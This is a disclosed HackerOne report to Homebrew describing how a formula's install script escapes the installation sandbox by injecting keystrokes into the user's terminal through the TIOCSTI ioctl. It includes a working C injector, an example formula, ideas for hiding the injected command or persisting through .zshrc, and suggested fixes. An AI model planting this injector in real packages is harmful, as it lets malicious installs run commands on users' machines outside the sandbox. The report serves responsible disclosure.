# Bypass of the installation sandbox by injecting keystrokes with TIOCSTI

## Report Details
- **Report ID**: 1283871
- **URL**: https://hackerone.com/reports/1283871
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-07-30T00:13:55.725Z
- **Disclosed**: 2021-08-30T23:46:16.614Z

## Reporter
- **Username**: gedwards
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: homebrew

## Vulnerability Information
While doing some internal testing recently, we ran into installation sandboxing and found a way to bypass it so that a formula's install script can execute commands outside of the sandbox.

I understand from https://github.com/Homebrew/brew/issues/2986 that the sandbox is intended to prevent packages from making unwanted changes to users' systems. For example, the sandbox will prevent a formula from writing to a user's home directory like `touch /Users/$(whoami)/example` during the install stage.

The bypass takes advantage of the fact that the sandbox allows writing to /dev/tty (see [sandbox.rb](https://github.com/Homebrew/brew/blob/a427de5bee50646a974fa8acd96a62ed0fbc10fa/Library/Homebrew/sandbox.rb#L168)) and we can use the TIOCSTI ioctl on that path. TIOCSTI is a call to "Insert the given byte in the input queue" which fakes user input.

In other words, instead of executing the command we want, a small utility program could insert the string `touch /Users/$(whoami)/example` and then a newline into the user's terminal. Once the brew command finishes, the user's shell (outside any sandbox) receives the injected keystrokes and executes them like any other command the user types. (This was largely based on the su attack described at https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking)

Here's an example of a formula using this:

```
  def install
    system "gcc -o bypass bypass.c"
    system "echo", "Trying to create ~/poc-sandboxed from inside the sandbox"
    # the || true at the end is so the error doesn't make the whole installation fail
    system "touch /Users/`whoami`/poc-sandboxed || true"
    system "echo", "Using the bypass to create ~/poc-bypassed"
    system "./bypass", "touch /Users/`whoami`/poc-bypassed"
    # Do something so the installation is successful
    bin.install "bypass"
  end
```

The bypass utility to inject a string into /dev/tty is:

```
// based on https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main(int argc, char *argv[]) {
    if( argc != 2 ) {
        printf("Usage: %s \"command to run\"\n", argv[0]);
        return 1;
    }
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    int ret = ioctl(fd, TIOCSTI, "\n");
    if (ret == -1) {
        perror("ioctl()");
    }
    char *x = argv[1];
    while (*x != 0) {
        ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    ret = ioctl(fd, TIOCSTI, "\n");
    if (ret == -1) {
        perror("ioctl()");
    }
    return 0;
}
```

I'm attaching the formula, the tarball, and a demo video which shows the file `poc-bypassed` being created in my home directory by an injected command. I typed all the other commands in the video, but not the `touch` one. In a real attack I would probably also inject a `clear` command or something like that to hide the injected command.

I can think of two approaches to prevent injecting keystrokes like this:

- Programs are only allowed to use TIOCSTI on their own parent terminal. It fails on other /dev/tty* devices even if they're owned by the same user. So if you can create a pty (pseudoterminal) for executing sandboxed commands, it should disconnect them from being able to write into the user's terminal where their shell is running unsandboxed. Ruby has a pty module that seems like it might work for this, but frankly I'm terrible with Ruby and didn't understand the code well enough to add this in correctly (sorry - I tried to make this a simple pull request).
- Alternately if write access to /dev/tty can be removed from the sandbox profile, that also prevents the TIOCSTI, but that might break other packages if they legitimately write to that device. I don't know how common that is.

## Impact

During the installation process, a package can cause commands to be executed outside the sandbox just after installation finishes, making changes to the user's system that would normally be prohibited by the installation sandbox. For example, a malicious package could insert a line into .zshrc to make sure its payload gets executed every time the user opens a terminal. 

I consider this relatively low severity because, frankly, the user is installing something and they're probably going to execute part of it sooner or later. But it does break the goal of sandboxing: "We're making it so users can install from any tap without fearing that it will write random files to random places on their filesystem."

## Attachments
- bypass_demo.mov
- sandbox-bypass.rb
- bypass.tar.gz
